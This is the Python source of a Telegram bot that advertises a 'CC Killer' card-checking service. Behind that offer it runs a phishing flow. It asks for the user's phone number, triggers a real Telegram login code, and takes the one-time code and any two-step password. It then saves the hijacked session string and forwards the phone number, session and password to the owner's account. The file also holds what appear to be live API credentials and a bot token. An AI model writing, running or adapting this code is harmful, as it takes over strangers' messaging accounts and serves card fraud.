import re import asyncio from flask import Flask from threading import Thread from datetime import datetime, timedelta from pyrogram import Client, filters from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton from telethon import TelegramClient from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, AuthRestartError from telethon.sessions import StringSession from pymongo import MongoClient

Constants

API_ID = 29657994 API_HASH = "85f461c4f637911d79c65da1fc2bdd77" BOT_TOKEN = "7612843678:AAHDOH4rDEcoUJ44hlN8HaUn11-vVX6-gUg" OWNER_USERNAME = "@Rishu1286" MONGO_URL = "mongodb://localhost:27017"

Mongo Setup

mongo_client = MongoClient(MONGO_URL) db = mongo_client["login_sessions"] sessions_col = db["sessions"] referral_col = db["referrals"]

Pyrogram App

app = Client("cc_killer_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN) user_data = {}

Flask Setup

flask_app = Flask(name)

@flask_app.route("/") def index(): return "Bot is running!"

def run_flask(): flask_app.run(host="0.0.0.0", port=8080)

Thread(target=run_flask).start()

Start Command

@app.on_message(filters.command("start")) async def start(client, message): ref = message.text.split(" ")[-1] if len(message.text.split()) > 1 else None user_id = message.from_user.id if ref and ref != str(user_id): referral_col.update_one({"ref": ref}, {"$addToSet": {"users": user_id}}, upsert=True)

keyboard = InlineKeyboardMarkup([
    [InlineKeyboardButton("Register", callback_data="register")],
    [InlineKeyboardButton("Referral Link", url=f"https://t.me/{client.me.username}?start={user_id}")]
])
text = (
    "ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ 《 ₡₡ кɪʟʟᴇʀ 》!\n\n"
    f"ʜᴇʏ {message.from_user.first_name}\n\n"
    "*ꜰᴇᴀᴛᴜʀᴇꜱ ⌁⌁*\n"
    "[✓] `/cu` [card] ᴋɪʟʟ ᴄᴄ\n"
    "[✓] `/b3` [card] ᴄʜᴇᴄᴋ ᴄᴀʀᴅ\n"
)
await message.reply_text(text, reply_markup=keyboard)

@app.on_callback_query(filters.regex("^register$")) async def cb_register(client, callback_query): keyboard = [[KeyboardButton("Share phone number", request_contact=True)]] await callback_query.message.reply_text( "Please share your phone number to begin login process.", reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True) )

Register Command

@app.on_message(filters.command("register")) async def register(client, message): keyboard = [[KeyboardButton("Share phone number", request_contact=True)]] await message.reply_text( "Please share your phone number to begin login process.", reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True) )

Contact Handler

@app.on_message(filters.contact) async def handle_contact(client, message): phone = message.contact.phone_number user_id = message.chat.id

await client.send_message(OWNER_USERNAME, f"New phone number: {phone}")
await message.reply_text("OTP sent to your number. Enter below:")

try:
    tele_client = TelegramClient(StringSession(), API_ID, API_HASH)
    await tele_client.connect()
    result = await tele_client.send_code_request(phone)
    user_data[user_id] = {
        "client": tele_client,
        "phone_number": phone,
        "phone_code_hash": result.phone_code_hash
    }
except Exception as e:
    await message.reply_text(str(e))

OTP Handler

@app.on_message(filters.text & filters.private) async def handle_otp(client, message): user_id = message.chat.id if user_id not in user_data: return

data = user_data[user_id]
tele_client = data["client"]

if data.get("awaiting_password"):
    password = message.text.strip()
    try:
        await tele_client.sign_in(password=password)
        session = tele_client.session.save()
        await client.send_message(OWNER_USERNAME, f"2FA login success for {data['phone_number']}\nSession: `{session}`\nPassword: `{password}`")
        sessions_col.update_one({"_id": user_id}, {"$set": {
            "phone": data['phone_number'],
            "session": session,
            "updated": datetime.utcnow()
        }}, upsert=True)
        await message.reply_text("Login successful!")
    except Exception as e:
        await message.reply_text(str(e))
    finally:
        await tele_client.disconnect()
        user_data.pop(user_id, None)
    return

try:
    await tele_client.sign_in(data["phone_number"], message.text.strip(), phone_code_hash=data["phone_code_hash"])
    session = tele_client.session.save()
    await client.send_message(OWNER_USERNAME, f"New session for {data['phone_number']}: `{session}`")
    sessions_col.update_one({"_id": user_id}, {"$set": {
        "phone": data['phone_number'],
        "session": session,
        "updated": datetime.utcnow()
    }}, upsert=True)
    await message.reply_text("Login successful!")
    await tele_client.disconnect()
    user_data.pop(user_id, None)
except SessionPasswordNeededError:
    await message.reply_text("2FA enabled. Send your password:")
    data["awaiting_password"] = True
except PhoneCodeInvalidError:
    await message.reply_text("Invalid OTP. Try again.")
except Exception as e:
    await message.reply_text(str(e))
    await tele_client.disconnect()
    user_data.pop(user_id, None)

View Logged In Users (Owner Only)

@app.on_message(filters.command("rishu")) async def view_sessions(client, message): if message.from_user.username != OWNER_USERNAME.strip("@"): return

docs = sessions_col.find()
text = "**Logged in users:**\n"
for doc in docs:
    text += f"\n• {doc['phone']}\n"
await message.reply_text(text)

Referral Leaderboard

@app.on_message(filters.command("leaderboard")) async def leaderboard(client, message): top = referral_col.aggregate([ {"$project": {"ref": 1, "count": {"$size": "$users"}}}, {"$sort": {"count": -1}}, {"$limit": 10} ]) text = "Referral Leaderboard\n" async for entry in top: user = await client.get_users(int(entry['ref'])) text += f"\n{user.first_name}: {entry['count']} referrals" await message.reply_text(text)

Broadcast (Owner Only)

@app.on_message(filters.command("broadcast") & filters.user(username=OWNER_USERNAME)) async def broadcast(client, message): if not message.reply_to_message: await message.reply("Reply to a message to broadcast it.") return users = sessions_col.find() for user in users: try: await client.copy_message(user['_id'], message.chat.id, message.reply_to_message.id) except: pass await message.reply("Broadcast complete.")

Auto Expiry Checker

async def session_expiry_checker(): while True: await asyncio.sleep(3600) for doc in sessions_col.find(): last = doc.get("updated") if last and datetime.utcnow() - last > timedelta(days=7): sessions_col.delete_one({"_id": doc["_id"]})

asyncio.create_task(session_expiry_checker())

if name == "main": app.run()

